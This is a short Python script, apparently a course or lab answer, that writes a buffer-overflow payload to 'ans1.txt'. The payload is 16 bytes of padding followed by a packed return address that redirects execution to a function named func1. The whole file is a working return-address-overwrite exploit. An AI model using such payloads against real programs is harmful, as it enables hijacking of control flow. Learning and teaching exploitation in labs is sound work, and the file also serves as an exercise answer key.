import struct

# Address of func1
func1_addr = 0x401216

# Offset to return address
# buffer (8 bytes) + saved rbp (8 bytes) = 16 bytes
padding = b'A' * 16

# Payload
payload = padding + struct.pack('<Q', func1_addr)

with open('ans1.txt', 'wb') as f:
    f.write(payload)

print("Created ans1.txt")
